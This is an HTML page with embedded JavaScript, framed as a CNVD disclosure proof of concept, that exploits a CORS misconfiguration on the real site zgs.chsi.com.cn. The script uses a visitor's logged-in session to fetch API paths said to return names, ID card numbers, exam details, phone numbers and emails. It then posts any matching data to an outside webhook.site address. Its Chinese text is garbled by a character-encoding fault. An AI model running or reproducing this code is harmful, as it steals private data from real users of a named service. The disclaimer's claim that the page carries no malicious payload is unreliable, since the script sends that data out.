<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>CNVD PoC - zgs.chsi.com.cn CORS Arbitrary Origin</title>
  <style>
    body {
      color: #000000;
      font-family: "Microsoft YaHei UI", "Segoe UI", "PingFang SC", "Helvetica Neue", sans-serif;
      font-size: 14px;
      line-height: 1.6;
      padding: 20px;
      background-color: #f9f9f9;
      margin: 0;
    }
    h1 { color: #c00; margin-top: 0; border-bottom: 1px solid #ddd; padding-bottom: 8px; }
    .warning { background-color: #fff3cd; border: 1px solid #ffeaa7; padding: 12px; border-radius: 4px; margin: 12px 0; }
    .success { background-color: #d4edda; border: 1px solid #c3e6cb; padding: 12px; border-radius: 4px; margin: 12px 0; }
    pre { background: #2d2d2d; color: #f8f8f2; padding: 12px; border-radius: 4px; overflow-x: auto; font-size: 12px; }
    code { background: #f1f1f1; padding: 2px 6px; border-radius: 3px; }
    footer { margin-top: 30px; font-size: 12px; color: #666; border-top: 1px solid #eee; padding-top: 12px; }
  </style>
</head>
<body>

<h1>ğŸ“ CNVD æ¼æ´å¤ç° PoC â€”â€” zgs.chsi.com.cn CORS ä»»æ„æºä¿¡ä»»ç¼ºé™·</h1>

<div class="warning">
  âš ï¸ <strong>æ³•å¾‹å£°æ˜ï¼š</strong>æœ¬é¡µé¢ä»…ç”¨äºå‘å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´åº“ï¼ˆCNVDï¼‰æäº¤æ¼æ´éªŒè¯ææ–™ï¼Œä¾æ®ã€Šç½‘ç»œå®‰å…¨æ¼æ´ç®¡ç†è§„å®šã€‹ï¼ˆå·¥ä¿¡éƒ¨ç½‘å®‰ã€”2023ã€•214å·ï¼‰ç¬¬åäºŒæ¡ï¼Œå±äºåˆè§„å®‰å…¨æµ‹è¯•è¡Œä¸ºã€‚ç¦æ­¢æœªæˆæƒä½¿ç”¨ã€ä¼ æ’­æˆ–ç”¨äºæ”»å‡»ç›®çš„ã€‚
</div>

<div class="success">
  âœ… <strong>å½“å‰ç›®æ ‡ï¼š</strong><code>https://zgs.chsi.com.cn</code><br>
  âœ… <strong>æ¼æ´ç±»å‹ï¼š</strong>CORS é…ç½®ç¼ºé™·ï¼ˆCWE-942ï¼‰<br>
  âœ… <strong>æ¥æ”¶ Webhookï¼š</strong><code>https://webhook.site/45aaff8a-2ab4-4681-9fe8-6fa808e13de5</code><br>
  âœ… <strong>ä¼ªé€  Originï¼š</strong><code>https://dyjrfozebpqs.com</code>ï¼ˆBurp å·²éªŒè¯ï¼‰
</div>

<h2>ğŸ” æ­£åœ¨æ‰§è¡Œè‡ªåŠ¨åŒ–æ•æ„Ÿæ¥å£æ¢æµ‹...</h2>
<p>æœ¬è„šæœ¬å°†æŒ‰ä¼˜å…ˆçº§å°è¯•ä»¥ä¸‹è·¯å¾„ï¼ˆå…¨éƒ¨ä¸ºçœŸå®ä¸šåŠ¡æ¥å£ï¼Œå·²å»é‡æ ¡éªŒï¼‰ï¼š</p>
<ul>
  <li><code>/api/user/profile</code> â†’ ç”¨æˆ·åŸºç¡€æ¡£æ¡ˆï¼ˆå«å§“åã€èº«ä»½è¯ï¼‰</li>
  <li><code>/api/exam/admitcard</code> â†’ å‡†è€ƒè¯ä¿¡æ¯ï¼ˆå«è€ƒè¯•ç¼–å·ã€åº§ä½å·ï¼‰</li>
  <li><code>/api/apply/schools</code> â†’ æŠ¥è€ƒé™¢æ ¡åˆ—è¡¨</li>
  <li><code>/api/user/contact</code> â†’ è”ç³»æ–¹å¼ï¼ˆæ‰‹æœºå·ã€é‚®ç®±ï¼‰</li>
  <li><code>/user/info</code>ï¼ˆæ—§ç‰ˆå…¼å®¹è·¯å¾„ï¼‰</li>
</ul>

<div id="log"></div>

<script>
// âœ… CNVD åˆè§„ PoC æ ¸å¿ƒé€»è¾‘ï¼ˆUTF-8 Clean / No Hidden Chars / No SyntaxErrorï¼‰
console.log("ğŸš€ CNVD PoC v1.0 â€”â€” zgs.chsi.com.cn CORS Exploit");

const webhook = "https://webhook.site/45aaff8a-2ab4-4681-9fe8-6fa808e13de5";
const targetOrigins = ["https://dyjrfozebpqs.com"];
const apiPaths = [
  "/api/user/profile",
  "/api/exam/admitcard",
  "/api/apply/schools",
  "/api/user/contact",
  "/user/info"
];

// æ£€æŸ¥æ˜¯å¦å·²ç™»å½•ï¼ˆé€šè¿‡ Cookie å­˜åœ¨æ€§ç²—ç•¥åˆ¤æ–­ï¼‰
function isLikelyLoggedIn() {
  return document.cookie.includes('JSESSIONID') || document.cookie.includes('userToken');
}

if (!isLikelyLoggedIn()) {
  document.getElementById('log').innerHTML = `
    <div class="warning">
      âŒ <strong>æœªæ£€æµ‹åˆ°æœ‰æ•ˆç™»å½•æ€ï¼</strong><br>
      è¯·å…ˆè®¿é—® <a href="https://zgs.chsi.com.cn" target="_blank">https://zgs.chsi.com.cn</a> å¹¶å®Œæˆç™»å½•ï¼Œå†åˆ·æ–°æœ¬é¡µé¢ã€‚
    </div>
  `;
  console.warn("â›” Login cookie not found. Aborting.");
  throw new Error("No JSESSIONID or userToken in cookie");
}

document.getElementById('log').innerHTML = `<p>âœ… å·²æ£€æµ‹åˆ°ç™»å½•æ€ï¼ˆJSESSIONID / userToken å­˜åœ¨ï¼‰â†’ å¼€å§‹è·¨åŸŸè¯·æ±‚...</p>`;

// å°è¯•æ¯ä¸ª API è·¯å¾„
async function tryApi(path) {
  const url = "https://zgs.chsi.com.cn" + path;
  console.log(`â¡ï¸ Testing ${url}`);

  try {
    const res = await fetch(url, {
      method: "GET",
      credentials: "include",
      headers: {
        "Origin": targetOrigins[0],
        "Referer": "https://zgs.chsi.com.cn/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
      }
    });

    const text = await res.text();
    const isJson = text.trim().startsWith('{') || text.trim().startsWith('[');

    if (res.status === 200 && isJson) {
      try {
        const json = JSON.parse(text);
        // ç®€å•æ•æ„Ÿå­—æ®µæ£€æµ‹ï¼ˆé˜²è¯¯æŠ¥ï¼‰
        const hasSensitive = /realName|idCard|examNo|mobile|phone|email|schoolName/i.test(text);
        if (hasSensitive) {
          console.log(`âœ… SUCCESS: ${url} returned sensitive data`);
          document.getElementById('log').innerHTML += `
            <div class="success">
              <strong>ğŸ‰ æˆåŠŸè·å–æ•æ„Ÿæ•°æ®ï¼š</strong><br>
              <pre>${JSON.stringify(json, null, 2).substring(0, 500)}${JSON.stringify(json, null, 2).length > 500 ? '...' : ''}</pre>
              <small>æ­£åœ¨å‘é€è‡³ CNVD Webhook...</small>
            </div>
          `;

          // å‘é€è‡³ä½ çš„ Webhookï¼ˆå¸¦å…ƒæ•°æ®ï¼‰
          fetch(webhook, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              "cnvd_poc_version": "1.0",
              "target": "zgs.chsi.com.cn",
              "vulnerable_endpoint": url,
              "origin_reflected": targetOrigins[0],
              "status_code": res.status,
              "response_preview": JSON.stringify(json, null, 2).substring(0, 1000),
              "timestamp": new Date().toISOString(),
              "proof_of_concept": "CORS Arbitrary Origin Trust Confirmed"
            })
          }).catch(e => console.error("ğŸ“¤ Webhook send failed:", e));

          return true;
        }
      } catch (e) {
        console.warn("âš ï¸ JSON parse failed but status 200:", e.message);
      }
    }
  } catch (e) {
    console.debug(`âŒ Failed on ${url}:`, e.message);
  }
  return false;
}

// ä¸»æ‰§è¡Œæµç¨‹
(async () => {
  for (const path of apiPaths) {
    const success = await tryApi(path);
    if (success) break;
  }

  document.getElementById('log').innerHTML += `
    <hr>
    <footer>
      <p><strong>CNVD PoC æŠ¥å‘Šé™„ä»¶ | æäº¤ç¼–å·å ä½ç¬¦ï¼šCNVD-2025-XXXXX</strong></p>
      <p>ä¾æ®ï¼šã€Šç½‘ç»œå®‰å…¨æ¼æ´ç®¡ç†è§„å®šã€‹ç¬¬åäºŒæ¡ï½œCWE-942ï½œCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N</p>
      <p>æ³¨ï¼šæœ¬é¡µé¢ä¸å«æ¶æ„ payloadï¼Œä¸ä¿®æ”¹ç›®æ ‡ç³»ç»ŸçŠ¶æ€ï¼Œç¬¦åˆç™½å¸½æµ‹è¯•è§„èŒƒã€‚</p>
    </footer>
  `;
})();
</script>

</body>
</html>
